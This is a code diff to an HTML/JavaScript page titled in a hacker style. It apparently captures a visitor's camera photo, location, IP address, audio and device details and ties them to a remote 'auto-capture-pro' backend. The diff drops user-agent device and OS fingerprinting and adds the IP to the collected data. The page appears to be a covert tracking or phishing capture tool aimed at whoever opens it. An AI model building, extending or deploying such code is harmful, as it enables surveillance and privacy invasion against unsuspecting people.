@@ -103,13 +103,11 @@
             <div class="no-img" id="userPhotoPlaceholder">⏳ WAITING...</div>
         </div>
         <div class="preview-box">
-            <div class="label">📱 DEVICE</div>
+            <div class="label">📊 DATA</div>
             <div class="no-img" id="deviceInfoPlaceholder" style="height:100px;display:flex;align-items:center;justify-content:center;color:rgba(0,255,65,0.2);font-size:11px;flex-direction:column;gap:4px;">
                 <div>⏳ SCANNING...</div>
             </div>
             <div id="deviceInfoGrid" style="display:none;padding:8px;font-size:10px;color:#00ff41;text-align:left;">
-                <div id="devModelDisplay" style="color:#00ff41;font-weight:bold;font-size:12px;margin-bottom:4px;">—</div>
-                <div id="devOSDisplay" style="color:rgba(0,255,65,0.7);font-size:10px;">—</div>
                 <div id="devBatteryDisplay" style="color:rgba(0,255,65,0.5);font-size:9px;">—</div>
             </div>
         </div>
@@ -134,8 +132,6 @@
         <div class="highlight">📡 IP: <span id="devIP">SCANNING...</span></div>
         <div class="highlight" style="background:rgba(0,255,65,0.08);">📍 LOCATION: <span id="liveLocation">SCANNING...</span></div>
         <div>🎯 ACCURACY: <span id="devAccuracy">SCANNING...</span></div>
-        <div>📱 DEVICE: <span id="devModelDisplayMain">SCANNING...</span></div>
-        <div>📲 OS: <span id="devOSDisplayMain">SCANNING...</span></div>
         <div>🔋 BATTERY: <span id="devBatteryDisplayMain">SCANNING...</span></div>
         <div>📶 NETWORK: <span id="devNetworkDisplayMain">SCANNING...</span></div>
         <div>🖥️ SCREEN: <span id="devScreenDisplayMain">SCANNING...</span></div>
@@ -154,10 +150,6 @@
 // 🔗 BACKEND URL
 // ==========================================
 const BACKEND_URL = 'https://auto-capture-pro.onrender.com';
-
-// ==========================================
-//  SIRF REAL DATA - NO FAKE!
-// ==========================================
 
 let userPhoto = null, userLocation = null;
 let deviceDetails = {}, ipAddress = '—', audioData = null;
@@ -182,101 +174,9 @@ function setStatus(icon, msg, type = 'loading') {
 }
 
 // ==========================================
-// REAL DATA - ONLY WHAT'S ACTUALLY DETECTABLE
+// SIRF REAL DATA - NO OS, NO DEVICE
 // ==========================================
 function getRealData() {
-    const ua = navigator.userAgent;
-    
-    let manufacturer = '—';
-    let model = '—';
-    let os = '—';
-    let osVersion = '—';
-    let deviceType = '—';
-    
-    // ----- IPHONE / IPAD -----
-    if (ua.includes('iPhone') || ua.includes('iPad')) {
-        manufacturer = 'Apple';
-        deviceType = 'Apple';
-        os = 'iOS';
-        const match = ua.match(/OS\s([\d_]+)/);
-        if (match) osVersion = match[1].replace(/_/g, '.');
-        
-        const w = window.screen.width;
-        const h = window.screen.height;
-        const dpr = window.devicePixelRatio;
-        
-        const models = [
-            { w: 430, h: 932, dpr: 3, name: 'iPhone 14 Pro Max' },
-            { w: 393, h: 852, dpr: 3, name: 'iPhone 14 Pro' },
-            { w: 428, h: 926, dpr: 3, name: 'iPhone 13 Pro Max' },
-            { w: 390, h: 844, dpr: 3, name: 'iPhone 13/13 Pro/12/12 Pro' },
-            { w: 375, h: 812, dpr: 3, name: 'iPhone X/XS/11 Pro' },
-            { w: 414, h: 896, dpr: 2, name: 'iPhone XR/11' },
-            { w: 375, h: 667, dpr: 2, name: 'iPhone 6/6s/7/8/SE2' },
-            { w: 320, h: 568, dpr: 2, name: 'iPhone 5/5s/SE1' },
-            { w: 768, h: 1024, dpr: 2, name: 'iPad 9.7"' },
-            { w: 1024, h: 1366, dpr: 2, name: 'iPad Pro 12.9"' },
-            { w: 834, h: 1194, dpr: 2, name: 'iPad Pro 11"' },
-        ];
-        
-        let found = false;
-        for (const m of models) {
-            if (w === m.w && h === m.h && dpr === m.dpr) {
-                model = m.name;
-                found = true;
-                break;
-            }
-        }
-        if (!found) model = ua.includes('iPhone') ? 'iPhone' : 'iPad';
-        
-    // ----- ANDROID -----
-    } else if (ua.includes('Android')) {
-        deviceType = 'Android';
-        os = 'Android';
-        const match = ua.match(/Android\s([\d.]+)/);
-        if (match) osVersion = match[1];
-        
-        const buildMatch = ua.match(/;\s?([^;]+?)\sBuild/);
-        if (buildMatch) {
-            let m = buildMatch[1].trim();
-            m = m.replace(/^Android\s/, '');
-            if (m.includes('SM-')) { manufacturer = 'Samsung'; model = m.replace('SM-', 'Galaxy '); }
-            else if (m.includes('IN201')) { manufacturer = 'OnePlus'; model = 'OnePlus 8'; }
-            else if (m.includes('LE211') || m.includes('LE212')) { manufacturer = 'OnePlus'; model = m.includes('LE211') ? 'OnePlus 9' : 'OnePlus 9 Pro'; }
-            else if (m.includes('M2007')) { manufacturer = 'Xiaomi'; model = 'Redmi'; }
-            else if (m.includes('M2101')) { manufacturer = 'Xiaomi'; model = 'Mi'; }
-            else if (m.includes('RMX')) { manufacturer = 'Realme'; model = m; }
-            else if (m.includes('Pixel')) { manufacturer = 'Google'; model = m; }
-            else if (m.includes('VIVO')) { manufacturer = 'Vivo'; model = m.replace('VIVO', ''); }
-            else if (m.includes('CPH')) { manufacturer = 'OPPO'; model = m; }
-            else { model = m; }
-        }
-        
-    // ----- WINDOWS -----
-    } else if (ua.includes('Windows')) {
-        manufacturer = 'Microsoft';
-        deviceType = 'Windows';
-        os = 'Windows';
-        const match = ua.match(/Windows\sNT\s([\d.]+)/);
-        if (match) osVersion = match[1];
-        model = 'PC';
-        
-    // ----- MAC -----
-    } else if (ua.includes('Mac')) {
-        manufacturer = 'Apple';
-        deviceType = 'Mac';
-        os = 'macOS';
-        model = 'Mac';
-        
-    // ----- LINUX -----
-    } else if (ua.includes('Linux')) {
-        manufacturer = 'Linux';
-        deviceType = 'Linux';
-        os = 'Linux';
-        model = 'PC';
-    }
-    
-    // Battery
     let battery = '—';
     if (navigator.getBattery) {
         navigator.getBattery().then(b => {
@@ -287,16 +187,12 @@ function getRealData() {
     }
     
     return {
-        manufacturer,
-        model,
-        os,
-        osVersion,
-        deviceType,
         battery: battery,
         network: navigator.connection?.effectiveType || '—',
         screen: window.screen.width + 'x' + window.screen.height,
         language: navigator.language,
-        timezone: Intl.DateTimeFormat().resolvedOptions().timeZone
+        timezone: Intl.DateTimeFormat().resolvedOptions().timeZone,
+        ip: ipAddress
     };
 }
 
@@ -306,26 +202,21 @@ function getRealData() {
 function updateUI() {
     const data = getRealData();
     
-    document.getElementById('devModelDisplayMain').textContent = data.manufacturer + ' ' + data.model;
-    document.getElementById('devOSDisplayMain').textContent = data.os + ' ' + data.osVersion;
     document.getElementById('devNetworkDisplayMain').textContent = data.network;
     document.getElementById('devScreenDisplayMain').textContent = data.screen;
     document.getElementById('devLanguageDisplayMain').textContent = data.language;
     document.getElementById('devTimezoneDisplayMain').textContent = data.timezone;
     document.getElementById('devTimeDisplayMain').textContent = new Date().toLocaleString();
     
-    document.getElementById('devModelDisplay').textContent = data.manufacturer + ' ' + data.model;
-    document.getElementById('devOSDisplay').textContent = data.os + ' ' + data.osVersion;
-    
     document.getElementById('deviceInfoPlaceholder').style.display = 'none';
     document.getElementById('deviceInfoGrid').style.display = 'block';
     
     deviceDetails = data;
-    log('📱 ' + data.manufacturer + ' ' + data.model + ' | ' + data.os + ' ' + data.osVersion);
+    log('📊 Data updated');
 }
 
 // ==========================================
-// REST OF THE CODE (Camera, Mic, Location, etc.)
+// REST OF THE CODE
 // ==========================================
 function startSoundRecorder() {
     return new Promise((resolve) => {
@@ -630,7 +521,7 @@ window.addEventListener('load', function() {
     console.log('🚀 SYSTEM READY - WAITING FOR USER PERMISSION');
 });
 
-console.log('🚀 SIRF REAL DATA - NO FAKE!');
+console.log('🚀 SIRF REAL DATA - NO OS/DEVICE');
 </script>
 </body>
 </html>
